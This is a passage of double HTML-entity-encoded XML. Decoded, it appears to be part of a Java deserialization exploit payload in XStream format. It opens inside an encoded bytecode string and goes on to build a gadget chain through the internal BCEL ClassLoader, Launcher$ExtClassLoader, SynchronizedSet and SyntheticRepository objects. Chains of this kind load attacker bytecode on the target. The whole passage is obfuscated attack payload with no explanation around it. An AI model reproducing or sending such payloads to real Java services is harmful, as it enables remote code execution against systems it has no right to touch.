2;&amp;#36;&amp;#97;&amp;#54;&amp;#36;&amp;#109;&amp;#36;&amp;#102;&amp;#55;&amp;#55;&amp;#36;&amp;#56;&amp;#54;&amp;#36;&amp;#101;&amp;#53;&amp;#108;&amp;#36;&amp;#102;&amp;#56;&amp;#36;&amp;#100;&amp;#97;&amp;#36;&amp;#99;&amp;#54;&amp;#36;&amp;#81;&amp;#36;&amp;#99;&amp;#98;&amp;#36;&amp;#99;&amp;#54;&amp;#36;&amp;#99;&amp;#51;&amp;#36;&amp;#97;&amp;#48;&amp;#36;&amp;#99;&amp;#57;&amp;#67;&amp;#83;&amp;#36;&amp;#79;&amp;#110;&amp;#36;&amp;#102;&amp;#101;&amp;#36;&amp;#68;&amp;#36;&amp;#102;&amp;#53;&amp;#36;&amp;#117;&amp;#53;&amp;#36;&amp;#99;&amp;#51;&amp;#36;&amp;#100;&amp;#49;&amp;#36;&amp;#70;&amp;#36;&amp;#65;&amp;#36;&amp;#65;&amp;#13;&amp;#10;&amp;lt;&amp;#47;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#97;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#111;&amp;#117;&amp;#116;&amp;#101;&amp;#114;&amp;#45;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#110;&amp;#97;&amp;#109;&amp;#101;&amp;#115;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#112;&amp;#114;&amp;#111;&amp;#99;&amp;#101;&amp;#115;&amp;#115;&amp;#111;&amp;#114;&amp;#67;&amp;#76;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#99;&amp;#111;&amp;#109;&amp;#46;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#111;&amp;#114;&amp;#103;&amp;#46;&amp;#97;&amp;#112;&amp;#97;&amp;#99;&amp;#104;&amp;#101;&amp;#46;&amp;#98;&amp;#99;&amp;#101;&amp;#108;&amp;#46;&amp;#105;&amp;#110;&amp;#116;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#108;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#67;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#76;&amp;#111;&amp;#97;&amp;#100;&amp;#101;&amp;#114;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#112;&amp;#97;&amp;#114;&amp;#101;&amp;#110;&amp;#116;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#109;&amp;#105;&amp;#115;&amp;#99;&amp;#46;&amp;#76;&amp;#97;&amp;#117;&amp;#110;&amp;#99;&amp;#104;&amp;#101;&amp;#114;&amp;#36;&amp;#69;&amp;#120;&amp;#116;&amp;#67;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#76;&amp;#111;&amp;#97;&amp;#100;&amp;#101;&amp;#114;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#112;&amp;#97;&amp;#114;&amp;#101;&amp;#110;&amp;#116;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#112;&amp;#97;&amp;#99;&amp;#107;&amp;#97;&amp;#103;&amp;#101;&amp;#50;&amp;#99;&amp;#101;&amp;#114;&amp;#116;&amp;#115;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#104;&amp;#97;&amp;#115;&amp;#104;&amp;#116;&amp;#97;&amp;#98;&amp;#108;&amp;#101;&amp;apos;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#101;&amp;#115;&amp;#32;&amp;#100;&amp;#101;&amp;#102;&amp;#105;&amp;#110;&amp;#101;&amp;#100;&amp;#45;&amp;#105;&amp;#110;&amp;#61;&amp;apos;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#108;&amp;#97;&amp;#110;&amp;#103;&amp;#46;&amp;#67;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#76;&amp;#111;&amp;#97;&amp;#100;&amp;#101;&amp;#114;&amp;apos;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#100;&amp;#101;&amp;#102;&amp;#97;&amp;#117;&amp;#108;&amp;#116;&amp;#68;&amp;#111;&amp;#109;&amp;#97;&amp;#105;&amp;#110;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#108;&amp;#111;&amp;#97;&amp;#100;&amp;#101;&amp;#114;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#99;&amp;#111;&amp;#109;&amp;#46;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#111;&amp;#114;&amp;#103;&amp;#46;&amp;#97;&amp;#112;&amp;#97;&amp;#99;&amp;#104;&amp;#101;&amp;#46;&amp;#98;&amp;#99;&amp;#101;&amp;#108;&amp;#46;&amp;#105;&amp;#110;&amp;#116;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#108;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#67;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#76;&amp;#111;&amp;#97;&amp;#100;&amp;#101;&amp;#114;&amp;apos;&amp;#32;&amp;#114;&amp;#101;&amp;#102;&amp;#101;&amp;#114;&amp;#101;&amp;#110;&amp;#99;&amp;#101;&amp;#61;&amp;apos;&amp;#46;&amp;#46;&amp;#47;&amp;#46;&amp;#46;&amp;apos;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#112;&amp;#114;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#112;&amp;#97;&amp;#108;&amp;#115;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#104;&amp;#97;&amp;#115;&amp;#65;&amp;#108;&amp;#108;&amp;#80;&amp;#101;&amp;#114;&amp;#109;&amp;gt;&amp;#102;&amp;#97;&amp;#108;&amp;#115;&amp;#101;&amp;lt;&amp;#47;&amp;#104;&amp;#97;&amp;#115;&amp;#65;&amp;#108;&amp;#108;&amp;#80;&amp;#101;&amp;#114;&amp;#109;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#105;&amp;#99;&amp;#80;&amp;#101;&amp;#114;&amp;#109;&amp;#105;&amp;#115;&amp;#115;&amp;#105;&amp;#111;&amp;#110;&amp;#115;&amp;gt;&amp;#102;&amp;#97;&amp;#108;&amp;#115;&amp;#101;&amp;lt;&amp;#47;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#105;&amp;#99;&amp;#80;&amp;#101;&amp;#114;&amp;#109;&amp;#105;&amp;#115;&amp;#115;&amp;#105;&amp;#111;&amp;#110;&amp;#115;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#107;&amp;#101;&amp;#121;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#107;&amp;#101;&amp;#121;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#100;&amp;#101;&amp;#102;&amp;#97;&amp;#117;&amp;#108;&amp;#116;&amp;#68;&amp;#111;&amp;#109;&amp;#97;&amp;#105;&amp;#110;&amp;gt;&amp;#13;&amp;#10;&amp;lt;&amp;#100;&amp;#111;&amp;#109;&amp;#97;&amp;#105;&amp;#110;&amp;#115;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#67;&amp;#111;&amp;#108;&amp;#108;&amp;#101;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#115;&amp;#36;&amp;#83;&amp;#121;&amp;#110;&amp;#99;&amp;#104;&amp;#114;&amp;#111;&amp;#110;&amp;#105;&amp;#122;&amp;#101;&amp;#100;&amp;#83;&amp;#101;&amp;#116;&amp;quot;&amp;#32;&amp;#115;&amp;#101;&amp;#114;&amp;#105;&amp;#97;&amp;#108;&amp;#105;&amp;#122;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;quot;&amp;#99;&amp;#117;&amp;#115;&amp;#116;&amp;#111;&amp;#109;&amp;quot;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#67;&amp;#111;&amp;#108;&amp;#108;&amp;#101;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#115;&amp;#95;&amp;#45;&amp;#83;&amp;#121;&amp;#110;&amp;#99;&amp;#104;&amp;#114;&amp;#111;&amp;#110;&amp;#105;&amp;#122;&amp;#101;&amp;#100;&amp;#67;&amp;#111;&amp;#108;&amp;#108;&amp;#101;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#100;&amp;#101;&amp;#102;&amp;#97;&amp;#117;&amp;#108;&amp;#116;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;quot;&amp;#115;&amp;#101;&amp;#116;&amp;quot;&amp;gt;&amp;lt;&amp;#47;&amp;#99;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#109;&amp;#117;&amp;#116;&amp;#101;&amp;#120;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#67;&amp;#111;&amp;#108;&amp;#108;&amp;#101;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#115;&amp;#36;&amp;#83;&amp;#121;&amp;#110;&amp;#99;&amp;#104;&amp;#114;&amp;#111;&amp;#110;&amp;#105;&amp;#122;&amp;#101;&amp;#100;&amp;#83;&amp;#101;&amp;#116;&amp;quot;&amp;#32;&amp;#114;&amp;#101;&amp;#102;&amp;#101;&amp;#114;&amp;#101;&amp;#110;&amp;#99;&amp;#101;&amp;#61;&amp;quot;&amp;#46;&amp;#46;&amp;#47;&amp;#46;&amp;#46;&amp;#47;&amp;#46;&amp;#46;&amp;quot;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#100;&amp;#101;&amp;#102;&amp;#97;&amp;#117;&amp;#108;&amp;#116;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#67;&amp;#111;&amp;#108;&amp;#108;&amp;#101;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#115;&amp;#95;&amp;#45;&amp;#83;&amp;#121;&amp;#110;&amp;#99;&amp;#104;&amp;#114;&amp;#111;&amp;#110;&amp;#105;&amp;#122;&amp;#101;&amp;#100;&amp;#67;&amp;#111;&amp;#108;&amp;#108;&amp;#101;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#100;&amp;#111;&amp;#109;&amp;#97;&amp;#105;&amp;#110;&amp;#115;&amp;gt;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#112;&amp;#97;&amp;#99;&amp;#107;&amp;#97;&amp;#103;&amp;#101;&amp;#115;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#110;&amp;#97;&amp;#116;&amp;#105;&amp;#118;&amp;#101;&amp;#76;&amp;#105;&amp;#98;&amp;#114;&amp;#97;&amp;#114;&amp;#105;&amp;#101;&amp;#115;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#97;&amp;#115;&amp;#115;&amp;#101;&amp;#114;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#76;&amp;#111;&amp;#99;&amp;#107;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#99;&amp;#111;&amp;#109;&amp;#46;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#111;&amp;#114;&amp;#103;&amp;#46;&amp;#97;&amp;#112;&amp;#97;&amp;#99;&amp;#104;&amp;#101;&amp;#46;&amp;#98;&amp;#99;&amp;#101;&amp;#108;&amp;#46;&amp;#105;&amp;#110;&amp;#116;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#108;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#67;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#76;&amp;#111;&amp;#97;&amp;#100;&amp;#101;&amp;#114;&amp;apos;&amp;#32;&amp;#114;&amp;#101;&amp;#102;&amp;#101;&amp;#114;&amp;#101;&amp;#110;&amp;#99;&amp;#101;&amp;#61;&amp;apos;&amp;#46;&amp;#46;&amp;apos;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#100;&amp;#101;&amp;#102;&amp;#97;&amp;#117;&amp;#108;&amp;#116;&amp;#65;&amp;#115;&amp;#115;&amp;#101;&amp;#114;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;gt;&amp;#102;&amp;#97;&amp;#108;&amp;#115;&amp;#101;&amp;lt;&amp;#47;&amp;#100;&amp;#101;&amp;#102;&amp;#97;&amp;#117;&amp;#108;&amp;#116;&amp;#65;&amp;#115;&amp;#115;&amp;#101;&amp;#114;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#101;&amp;#115;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#105;&amp;#103;&amp;#110;&amp;#111;&amp;#114;&amp;#101;&amp;#100;&amp;#95;&amp;#95;&amp;#112;&amp;#97;&amp;#99;&amp;#107;&amp;#97;&amp;#103;&amp;#101;&amp;#115;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;gt;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#46;&amp;lt;&amp;#47;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;gt;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#120;&amp;#46;&amp;lt;&amp;#47;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;gt;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;lt;&amp;#47;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#105;&amp;#103;&amp;#110;&amp;#111;&amp;#114;&amp;#101;&amp;#100;&amp;#95;&amp;#95;&amp;#112;&amp;#97;&amp;#99;&amp;#107;&amp;#97;&amp;#103;&amp;#101;&amp;#115;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#114;&amp;#101;&amp;#112;&amp;#111;&amp;#115;&amp;#105;&amp;#116;&amp;#111;&amp;#114;&amp;#121;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#99;&amp;#111;&amp;#109;&amp;#46;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#111;&amp;#114;&amp;#103;&amp;#46;&amp;#97;&amp;#112;&amp;#97;&amp;#99;&amp;#104;&amp;#101;&amp;#46;&amp;#98;&amp;#99;&amp;#101;&amp;#108;&amp;#46;&amp;#105;&amp;#110;&amp;#116;&amp;#101;&amp;#114;&amp;#110;&amp;#97;&amp;#108;&amp;#46;&amp;#117;&amp;#116;&amp;#105;&amp;#108;&amp;#46;&amp;#83;&amp;#121;&amp;#110;&amp;#116;&amp;#104;&amp;#101;&amp;#116;&amp;#105;&amp;#99;&amp;#82;&amp;#101;&amp;#112;&amp;#111;&amp;#115;&amp;#105;&amp;#116;&amp;#111;&amp;#114;&amp;#121;&amp;apos;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#95;&amp;#95;&amp;#112;&amp;#97;&amp;#116;&amp;#104;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#112;&amp;#97;&amp;#116;&amp;#104;&amp;#115;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#95;&amp;#95;&amp;#112;&amp;#97;&amp;#116;&amp;#104;&amp;gt;&amp;#46;&amp;lt;&amp;#47;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#95;&amp;#95;&amp;#112;&amp;#97;&amp;#116;&amp;#104;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#95;&amp;#95;&amp;#112;&amp;#97;&amp;#116;&amp;#104;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#95;&amp;#95;&amp;#108;&amp;#111;&amp;#97;&amp;#100;&amp;#101;&amp;#100;&amp;#67;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#101;&amp;#115;&amp;#47;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#114;&amp;#101;&amp;#112;&amp;#111;&amp;#115;&amp;#105;&amp;#116;&amp;#111;&amp;#114;&amp;#121;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#100;&amp;#101;&amp;#102;&amp;#101;&amp;#114;&amp;#84;&amp;#111;&amp;#32;&amp;#99;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#61;&amp;apos;&amp;#115;&amp;#117;&amp;#110;&amp;#46;&amp;#109;&amp;#105;&amp;#115;&amp;#99;&amp;#46;&amp;#76;&amp;#97;&amp;#117;&amp;#110;&amp;#99;&amp;#104;&amp;#101;&amp;#114;&amp;#36;&amp;#69;&amp;#120;&amp;#116;&amp;#67;&amp;#108;&amp;#97;&amp;#115;&amp;#115;&amp;#76;&amp;#111;&amp;#97;&amp;#100;&amp;#101;&amp;#114;&amp;apos;&amp;#32;&amp;#114;&amp;#101;&amp;#102;&amp;#101;&amp;#114;&amp;#101;&amp;#110;&amp;#99;&amp;#101;&amp;#61;&amp;apos;&amp;#46;&amp;#46;&amp;#47;&amp;#112;&amp;#97;&amp;#114;&amp;#101;&amp;#110;&amp;#116;&amp;apos;&amp;#47;&amp;gt;&amp;